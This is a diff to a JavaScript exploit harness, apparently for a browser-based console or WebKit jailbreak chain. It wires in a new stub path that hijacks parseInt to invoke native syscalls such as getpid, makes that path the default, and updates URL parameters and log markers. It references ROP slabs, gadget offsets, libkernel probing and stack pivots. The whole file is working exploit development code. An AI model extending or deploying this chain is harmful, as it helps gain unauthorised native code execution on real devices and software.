@@ -73,7 +73,8 @@ import {
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js?v=core-6";
-import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, STUB_LAST_STEP_KEY } from "./stub_call.js?v=stub-5";
+import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, STUB_LAST_STEP_KEY } from "./stub_call.js?v=stub-7";
+import { fireG0Getpid, fireG0Smoke } from "./stub_g0_fire.js?v=stub-g0-1";
 import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall, fireUsleep, fireNotify, firePivotSmoke,
     resolvePivotBuiltin, firePivotTrigger,
     firePivotGetpid,
@@ -91,7 +92,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js?v=nc-20250831r";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250901d";
+const BUILD_ID = "rw-20250901e";
 
 function usePoopsNativePath() {
     return params.get("nativepath") === "poops";
@@ -5520,8 +5521,9 @@ function runFireGetpid() {
                 } catch (_) { }
             },
         };
-        mark("STUB-FIRE", "direct stub — NO ROP slab build=" + BUILD_ID
-            + (stubOpts.reuseCap === false ? " (arm)" : " parseInt(1)"));
+        const stubFire = params.get("stubfire") || "g0getpid";
+        mark("STUB-FIRE", "stubfire=" + stubFire + " build=" + BUILD_ID
+            + (stubOpts.reuseCap === false ? " (arm)" : ""));
         stubFlush();
         try {
             if (params.get("stubmode") === "collator") {
@@ -5535,7 +5537,16 @@ function runFireGetpid() {
                 window._stubCap = { mainMf: r.mainMf, mainOrig: r.mainOrig, path: "armed" };
                 mark("STUB-ARM-OK", r.stubTag + " mainMf=" + r.mainMf + " — parseInt restored, safe to reload");
                 state("stub arm OK — remove ?stubarm=1 then Fire", "ok");
+            } else if (stubFire === "g0" || stubFire === "smoke") {
+                fireG0Smoke(p, off, Object.assign({}, stubOpts, { retain: retained }));
+                mark("G0-SMOKE-OK", "parseInt(1) survived");
+                state("G0 smoke OK", "ok");
+            } else if (stubFire === "g0getpid") {
+                const r = fireG0Getpid(p, off, lk, Object.assign({}, stubOpts, { retain: retained }));
+                mark("G0-GETPID-OK", "pid=" + r.pid);
+                state(r.pid > 0 ? "getpid " + r.pid : "errno " + r.pid, r.pid > 0 ? "ok" : "warn");
             } else {
+                mark("STUB-HINT", "direct stub OOM on 13.52 — ?stubfire=g0getpid");
                 const r = fireStubSwapParseInt(p, off, lk, stubOpts);
                 mark("STUB-OK", r.stubTag + " jsResult=" + r.result + " arg=" + r.fireArg);
                 state("stub survived js=" + r.result, "ok");
@@ -6000,6 +6011,7 @@ const NATIVE_OPTION_PRESETS = {
         nativeprep: false,
         pivot: "ta",
         stubarm: "1",
+        stubfire: "g0getpid",
     },
 };
 
@@ -6084,6 +6096,10 @@ function applyNativeOptionsReload() {
 
     if (prof && prof.stubarm) u.searchParams.set("stubarm", "1");
     else u.searchParams.delete("stubarm");
+
+    if (prof && prof.stubfire) u.searchParams.set("stubfire", prof.stubfire);
+    else if (path === "stub") u.searchParams.set("stubfire", "g0getpid");
+    else u.searchParams.delete("stubfire");
 
     mark("NATIVE-RELOAD", u.pathname + "?" + u.searchParams.toString());
     renderOut();
@@ -6332,7 +6348,7 @@ function init() {
     mark("BOOT", "LK-PROBE line shows dynamic parse status");
     mark("BOOT", groomBootLine(params));
     if (useStubNativePath())
-        mark("BOOT", "stub: Arm restores parseInt (?stubarm=1) — Fire w/o stubarm uses parseInt(1) + syscall");
+        mark("BOOT", "stub: ?stubfire=g0getpid (default) — direct stub OOMs @ STUB-FIRE");
     replayHuntTrace();
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
